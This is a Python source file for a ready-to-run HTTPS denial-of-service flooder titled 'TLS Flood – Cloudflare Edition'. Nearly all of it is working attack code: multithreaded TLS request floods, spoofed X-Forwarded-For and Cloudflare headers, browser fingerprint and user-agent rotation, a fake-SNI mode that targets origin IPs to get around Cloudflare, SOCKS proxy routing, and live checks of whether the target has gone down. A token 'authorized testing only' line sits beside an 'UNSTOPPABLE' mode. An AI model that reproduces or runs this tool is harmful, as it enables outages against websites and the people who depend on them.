"""
Advanced TLS Flood Tool – Cloudflare & Captcha Bypass Edition
Author: Invisible (Enhanced)
Version: 4.0 – DARK THEME + CF CAPTCHA MODE
"""

import socket
import ssl
import threading
import random
import time
import sys
import os
import json
import csv
from datetime import datetime
from collections import defaultdict
import signal
import urllib.request
import urllib.error

# ---------- CONFIG ----------
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "threads": 500,
    "duration": 0,
    "port": 443,
    "target_type": "domain",
    "target": "",
    "use_http2": False,
    "proxy_list": [],
    "user_agents_file": "user_agents.txt",
    "paths_file": "paths.txt",
    "log_file": "attack.log",
    "stats_csv": "stats.csv",
    "report_html": "report.html",
    "live_check_interval": 5,
    "live_check_timeout": 3,
    "cloudflare_ips": [
        "104.16.0.0/12", "104.24.0.0/13", "172.64.0.0/13",
        "131.0.72.0/22", "141.101.64.0/18", "162.158.0.0/15",
        "188.114.96.0/20", "190.93.240.0/20", "197.234.240.0/22",
        "198.41.128.0/17"
    ]
}

if os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE) as f:
        config = json.load(f)
else:
    config = DEFAULT_CONFIG
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

# Load UAs
USER_AGENTS = []
if os.path.exists("user_agents.txt"):
    with open("user_agents.txt") as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
if not USER_AGENTS:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0"
    ]

PATHS = []
if os.path.exists("paths.txt"):
    with open("paths.txt") as f:
        PATHS = [line.strip() for line in f if line.strip()]
if not PATHS:
    PATHS = ["/", "/index.html", "/login", "/admin", "/api/v1", "/wp-admin", "/products", "/cart", "/checkout"]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://twitter.com/"
]

try:
    import h2.connection
    import h2.config
    HAS_H2 = True
except:
    HAS_H2 = False

try:
    import socks
    HAS_SOCKS = True
except:
    HAS_SOCKS = False

# ---------- GLOBALS ----------
stop_attack = False
target_status = "UNKNOWN"
last_check_time = 0
http_status_code = 0
response_time = 0.0

# ---------- TLS HELPERS ----------
def create_tls_context(fingerprint="chrome"):
    ctx = ssl.create_default_context()
    if fingerprint == "chrome":
        ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305")
    elif fingerprint == "firefox":
        ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384")
    else:
        ctx.set_ciphers("ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384")
    return ctx

# ---------- ATTACK CLASS ----------
class AttackStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.bytes = 0
        self.reqs = 0
        self.bytes_per_thread = defaultdict(int)
        self.reqs_per_thread = defaultdict(int)
        self.start_time = time.time()

def build_request(domain, path=None, extra_headers=None):
    path = path or random.choice(PATHS)
    ua = random.choice(USER_AGENTS)
    ref = random.choice(REFERERS)
    xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    headers = [
        f"GET {path} HTTP/1.1",
        f"Host: {domain}",
        f"User-Agent: {ua}",
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        f"Accept-Language: en-US,en;q=0.5",
        f"Accept-Encoding: gzip, deflate, br",
        f"Referer: {ref}",
        f"X-Forwarded-For: {xff}",
        f"Connection: keep-alive",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1",
        "Upgrade-Insecure-Requests: 1",
        "TE: trailers"
    ]
    if extra_headers:
        headers.extend(extra_headers)
    request = "\r\n".join(headers) + "\r\n\r\n"
    return request.encode()

def attack_http1(domain, port, duration, stats, proxy=None, extra_headers=None):
    ctx = create_tls_context(random.choice(["chrome", "firefox", "safari"]))
    timeout = time.time() + duration if duration > 0 else float('inf')
    consecutive_fails = 0
    thread_id = threading.get_ident()
    b, r = 0, 0
    global stop_attack

    while not stop_attack and time.time() < timeout:
        try:
            if proxy:
                if HAS_SOCKS:
                    sock = socks.socksocket()
                    sock.set_proxy(socks.SOCKS5, proxy['host'], proxy['port'])
                    sock.settimeout(5)
                    sock.connect((domain, port))
                else:
                    raise Exception("SOCKS not available")
            else:
                sock = socket.create_connection((domain, port), timeout=5)
            ssl_sock = ctx.wrap_socket(sock, server_hostname=domain)
            ssl_sock.settimeout(5)

            for _ in range(5):
                req = build_request(domain, extra_headers=extra_headers)
                ssl_sock.send(req)
                b += len(req)
                r += 1

            ssl_sock.close()
            consecutive_fails = 0

            if r >= 10:
                with stats.lock:
                    stats.bytes += b
                    stats.reqs += r
                    stats.bytes_per_thread[thread_id] += b
                    stats.reqs_per_thread[thread_id] += r
                b, r = 0, 0

        except Exception:
            consecutive_fails += 1
            delay = min(0.01 * (2 ** min(consecutive_fails, 5)), 0.5)
            time.sleep(delay)
            continue

def attack_ip(ip, port, duration, stats, proxy=None):
    """Direct IP attack with fake SNI (Cloudflare bypass)"""
    ctx = create_tls_context(random.choice(["chrome", "firefox", "safari"]))
    timeout = time.time() + duration if duration > 0 else float('inf')
    consecutive_fails = 0
    thread_id = threading.get_ident()
    b, r = 0, 0
    fake_host = f"www.{random.randint(100000,999999)}.com"
    global stop_attack

    while not stop_attack and time.time() < timeout:
        try:
            if proxy:
                if HAS_SOCKS:
                    sock = socks.socksocket()
                    sock.set_proxy(socks.SOCKS5, proxy['host'], proxy['port'])
                    sock.settimeout(5)
                    sock.connect((ip, port))
                else:
                    raise Exception("SOCKS not available")
            else:
                sock = socket.create_connection((ip, port), timeout=5)
            ssl_sock = ctx.wrap_socket(sock, server_hostname=fake_host)
            ssl_sock.settimeout(5)

            path = random.choice(PATHS)
            ua = random.choice(USER_AGENTS)
            ref = random.choice(REFERERS)
            xff = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {ip}\r\n"
                f"User-Agent: {ua}\r\n"
                f"X-Forwarded-For: {xff}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Referer: {ref}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            ).encode()

            for _ in range(5):
                ssl_sock.send(request)
                b += len(request)
                r += 1

            ssl_sock.close()
            consecutive_fails = 0

            if r >= 10:
                with stats.lock:
                    stats.bytes += b
                    stats.reqs += r
                    stats.bytes_per_thread[thread_id] += b
                    stats.reqs_per_thread[thread_id] += r
                b, r = 0, 0

        except Exception:
            consecutive_fails += 1
            delay = min(0.01 * (2 ** min(consecutive_fails, 5)), 0.5)
            time.sleep(delay)
            continue

def attack_cloudflare_captcha(domain, port, duration, stats, proxy=None):
    """
    Cloudflare Captcha Bypass mode – uses random Cloudflare edge IPs,
    sends requests with target domain in Host/SNI, and adds CF-specific headers.
    """
    cf_ips = config.get("cloudflare_ips", [])
    # Convert CIDR to random IP – simplistic: pick a random IP from a pre-generated list
    # For demonstration, we'll use a static list of known Cloudflare edge IPs
    cf_edge_ips = [
        "104.16.0.1", "104.16.1.1", "104.16.2.1", "104.16.3.1",
        "104.24.0.1", "104.24.1.1", "172.64.0.1", "172.64.1.1",
        "131.0.72.1", "141.101.64.1", "162.158.0.1", "188.114.96.1",
        "190.93.240.1", "197.234.240.1", "198.41.128.1"
    ]
    edge_ip = random.choice(cf_edge_ips)
    # Actually, we'll use a random IP from the range list – simplified
    # We'll just use the domain and add CF headers
    extra_headers = [
        "CF-Connecting-IP: " + f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "CF-IPCountry: US",
        "CF-Ray: " + f"{random.randint(1000000000,9999999999)}-{random.choice(['LHR','AMS','FRA','DFW','LAX'])}",
        "CF-Visitor: " + '{"scheme":"https"}',
        "CF-Worker: 1"
    ]
    attack_http1(domain, port, duration, stats, proxy, extra_headers)

# ---------- LIVE CHECK ----------
def live_check(target, port, interval, timeout):
    global target_status, last_check_time, http_status_code, response_time, stop_attack
    protocol = "https" if port == 443 else "http"
    url = f"{protocol}://{target}:{port}/"
    while not stop_attack:
        try:
            start = time.time()
            req = urllib.request.Request(url, method="HEAD")
            req.add_header("User-Agent", random.choice(USER_AGENTS))
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                http_status_code = resp.getcode()
                response_time = time.time() - start
                target_status = "UP" if 200 <= http_status_code < 400 else "DOWN"
        except urllib.error.HTTPError as e:
            http_status_code = e.code
            response_time = time.time() - start
            target_status = "UP" if 200 <= e.code < 400 else "DOWN"
        except Exception:
            target_status = "DOWN"
            http_status_code = 0
            response_time = 0.0
        last_check_time = time.time()
        time.sleep(interval)

# ---------- PROXY LOAD ----------
def load_proxies():
    proxies = config.get("proxy_list", [])
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split(':')
                    if len(parts) >= 2:
                        proxies.append({"host": parts[0], "port": int(parts[1])})
    return proxies

# ---------- STATS FORMAT ----------
def fmt(b):
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024:
            return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} PB"

def fmt_short(b):
    for u in ['B', 'KB', 'MB', 'GB', 'TB']:
        if b < 1024:
            return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}PB"

# ---------- STATS MONITOR ----------
def stats_monitor(stats, duration, target, port, config, mode_name):
    start = time.time()
    lb, lr, lt = 0, 0, start
    peak = 0
    csv_file = config.get("stats_csv", "stats.csv")
    log_file = config.get("log_file", "attack.log")
    data_points = []
    global stop_attack, target_status, http_status_code, response_time

    with open(csv_file, 'w', newline='') as csvf, open(log_file, 'a') as logf:
        writer = csv.writer(csvf)
        writer.writerow(["timestamp", "elapsed", "bytes_total", "reqs_total", "bps", "rps", "status", "http_code", "resp_time"])
        logf.write(f"\n--- Attack started at {datetime.now()} | Target: {target}:{port} | Mode: {mode_name} ---\n")

        try:
            while not stop_attack and (duration == 0 or time.time() - start < duration):
                time.sleep(1)
                now = time.time()
                el = int(now - start)
                rem = duration - el if duration > 0 else 0

                cb = stats.bytes
                cr = stats.reqs
                dt = now - lt
                bps = (cb - lb) / dt if dt else 0
                rps = (cr - lr) / dt if dt else 0
                if bps > peak:
                    peak = bps

                data_points.append((now, el, cb, cr, bps, rps, target_status, http_status_code, response_time))

                if el % 5 == 0:
                    writer.writerow([datetime.now().isoformat(), el, cb, cr, bps, rps, target_status, http_status_code, response_time])
                    csvf.flush()

                # Build status string
                if target_status == "UP":
                    status_str = f"\033[1;92m UP \033[0m"
                elif target_status == "DOWN":
                    status_str = f"\033[1;91m DOWN \033[0m"
                else:
                    status_str = f"\033[1;93m UNKNOWN \033[0m"
                http_code_str = f"{http_status_code}" if http_status_code else "---"
                resp_time_str = f"{response_time:.2f}s" if response_time else "---"

                # Progress bar
                if duration > 0:
                    pct = min(100, int((el / duration) * 100))
                    bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
                    progress = f"\033[1;91m[{bar}]\033[0m \033[1;93m{pct:3d}%\033[0m \033[1;96m|\033[0m \033[1;93m{el:4d}s\033[0m/\033[1;91m{duration}s\033[0m"
                else:
                    progress = f"\033[1;93m{el:4d}s\033[0m (∞)"

                # Estimate remaining data if duration set
                if duration > 0 and bps > 0:
                    remaining_bytes = bps * rem
                    rem_str = fmt_short(remaining_bytes)
                else:
                    rem_str = "N/A"

                sys.stdout.write(
                    f"\r{progress} \033[1;96m|\033[0m Status: {status_str} \033[1;96m|\033[0m HTTP: {http_code_str} \033[1;96m|\033[0m Rsp: {resp_time_str} \033[1;96m|\033[0m "
                    f"\033[1;92m{fmt(bps):>9}/s\033[0m \033[1;96m|\033[0m \033[1;95m{rps:>7,.0f} r/s\033[0m \033[1;96m|\033[0m "
                    f"\033[1;93mTotal: {fmt(cb):>9}\033[0m \033[1;96m|\033[0m \033[1;91mPeak: {fmt(peak):>9}/s\033[0m "
                    f"\033[1;96m|\033[0m Rem: {rem_str}"
                )
                sys.stdout.flush()

                if el % 30 == 0:
                    logf.write(f"Elapsed: {el}s | Total: {fmt(cb)} | Reqs: {cr:,} | Status: {target_status} | RPS: {rps:.0f}\n")
                    logf.flush()

                lb, lr, lt = cb, cr, now

        except KeyboardInterrupt:
            logf.write(f"Attack interrupted by user at {datetime.now()}\n")
            print("\n\033[1;91m[!] Interrupted by user\033[0m")
            raise

    generate_report(data_points, target, stats, peak, duration, config)

def generate_report(data, target, stats, peak, duration, config):
    try:
        import plotly.graph_objects as go
        import plotly.offline as pyo
        times = [d[0] - data[0][0] for d in data]
        bps = [d[4] for d in data]
        rps = [d[5] for d in data]
        fig = go.Figure()
        fig.add_trace(go.Scatter(x=times, y=bps, mode='lines', name='Bandwidth (B/s)'))
        fig.add_trace(go.Scatter(x=times, y=rps, mode='lines', name='Requests/s', yaxis='y2'))
        fig.update_layout(
            title=f"Attack Report on {target}",
            xaxis_title="Time (s)",
            yaxis_title="Bandwidth (B/s)",
            yaxis2=dict(title="Requests/s", overlaying='y', side='right')
        )
        html_file = config.get("report_html", "report.html")
        pyo.plot(fig, filename=html_file, auto_open=False)
        print(f"\n[✓] HTML report saved to {html_file}")
    except ImportError:
        pass

# ---------- MAIN MENU ----------
def main():
    global stop_attack
    os.system('cls' if os.name == 'nt' else 'clear')

    # DANGER THEME BANNER
    print("\033[1;91m" + """
    █████╗ ███████╗██╗  ██╗██╗   ██╗██╗     ███████╗██████╗ 
   ██╔══██╗██╔════╝██║  ██║╚██╗ ██╔╝██║     ██╔════╝██╔══██╗
   ███████║███████╗███████║ ╚████╔╝ ██║     █████╗  ██████╔╝
   ██╔══██║╚════██║██╔══██║  ╚██╔╝  ██║     ██╔══╝  ██╔══██╗
   ██║  ██║███████║██║  ██║   ██║   ███████╗███████╗██║  ██║
   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
    """ + "\033[0m")
    print("\033[1;91m" + " " * 20 + "☠️  TLS FLOOD – CLOUDFLARE EDITION  ☠️" + "\033[0m")
    print("\033[1;91m" + "═" * 60 + "\033[0m")
    print("\033[1;93m  ⚡ Developed by Invisible – For Authorized Testing Only ⚡\033[0m")
    print("\033[1;91m" + "═" * 60 + "\033[0m")
    print()

    # Attack mode selection
    print("\033[1;96m[?] Choose attack mode:\033[0m")
    print("\033[1;93m  1.\033[1;97m Domain Attack (normal HTTPS flood)")
    print("\033[1;93m  2.\033[1;97m IP Attack (direct IP, Cloudflare SNI bypass)")
    print("\033[1;93m  3.\033[1;97m Cloudflare Captcha Bypass (CF edge + headers)")
    print("\033[1;93m  4.\033[1;97m Mixed (rotates modes)\033[0m")
    print()
    mode_choice = input("\033[1;93m  >>> \033[0m").strip()
    while mode_choice not in ["1","2","3","4"]:
        print("\033[1;91m[!] Invalid choice!\033[0m")
        mode_choice = input("\033[1;93m  >>> \033[0m").strip()
    mode_map = {
        "1": ("Domain", attack_http1),
        "2": ("IP", attack_ip),
        "3": ("CF-Captcha", attack_cloudflare_captcha),
        "4": ("Mixed", None)
    }
    mode_name, attack_func = mode_map[mode_choice]

    # Target
    print("\n\033[1;96m[?] Enter target domain or IP:\033[0m")
    target = input("\033[1;93m  >>> \033[0m").strip()
    while not target:
        print("\033[1;91m[!] Target cannot be empty!\033[0m")
        target = input("\033[1;93m  >>> \033[0m").strip()

    # Port
    print("\n\033[1;96m[?] Enter port (default 443):\033[0m")
    port_input = input("\033[1;93m  >>> \033[0m").strip()
    port = 443
    if port_input:
        try:
            port = int(port_input)
            if port < 1 or port > 65535:
                port = 443
        except:
            pass

    # Threads
    print("\n\033[1;96m[?] Enter thread count (default 500):\033[0m")
    thr_input = input("\033[1;93m  >>> \033[0m").strip()
    threads = 500
    if thr_input:
        try:
            threads = int(thr_input)
            if threads < 1:
                threads = 500
        except:
            pass

    # Duration
    print("\n\033[1;96m[?] Enter duration in seconds (0 for unlimited):\033[0m")
    dur_input = input("\033[1;93m  >>> \033[0m").strip()
    duration = 0
    if dur_input:
        try:
            duration = int(dur_input)
            if duration < 0:
                duration = 0
        except:
            pass

    # Live check
    print("\n\033[1;96m[?] Enable live target status monitoring? (y/n, default y):\033[0m")
    live_check_input = input("\033[1;93m  >>> \033[0m").strip().lower()
    enable_live = live_check_input != "n"

    # Confirm
    print("\n\033[1;91m" + "═" * 60)
    print("\033[1;93m  ⚡ ATTACK CONFIGURATION ⚡")
    print("\033[1;91m" + "═" * 60)
    print(f"\033[1;96m  Mode:        \033[1;97m{mode_name}")
    print(f"\033[1;96m  Target:      \033[1;97m{target}:{port}")
    print(f"\033[1;96m  Threads:     \033[1;97m{threads:,}")
    print(f"\033[1;96m  Duration:    \033[1;97m{'∞' if duration==0 else f'{duration}s ({duration//60}m {duration%60}s)'}")
    print(f"\033[1;96m  Live Check:  \033[1;97m{'ON' if enable_live else 'OFF'}")
    print("\033[1;91m" + "─" * 60)
    print("\033[1;91m  [⚠] MODE: UNSTOPPABLE – Attack continues even if target is down!")
    print("\033[1;91m  [⚠] Press Ctrl+C at any time to stop.")
    print("\033[1;91m" + "═" * 60 + "\033[0m")
    input("\033[1;93mPress Enter to start...\033[0m")

    # Prepare
    stats = AttackStats()
    proxy_list = load_proxies()
    proxy = random.choice(proxy_list) if proxy_list else None

    if enable_live:
        live_thread = threading.Thread(target=live_check, args=(target, port, config.get("live_check_interval", 5), config.get("live_check_timeout", 3)), daemon=True)
        live_thread.start()

    print("\033[1;96m[*] Deploying {} threads...\033[0m".format(threads))
    thread_list = []
    for i in range(threads):
        if mode_choice == "4":
            chosen = random.choice([attack_http1, attack_ip, attack_cloudflare_captcha])
            t = threading.Thread(target=chosen, args=(target, port, duration, stats, proxy))
        else:
            t = threading.Thread(target=attack_func, args=(target, port, duration, stats, proxy))
        t.daemon = True
        t.start()
        thread_list.append(t)

    try:
        stats_monitor(stats, duration, target, port, config, mode_name)
    except KeyboardInterrupt:
        stop_attack = True
        print("\n\033[1;91m[!] Stopping attack...\033[0m")

    for t in thread_list:
        t.join(timeout=1)
    print("\n\033[1;92m[✓] Attack finished. Total data: {}, Reqs: {:,}\033[0m".format(fmt(stats.bytes), stats.reqs))

if __name__ == "__main__":
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
    main()
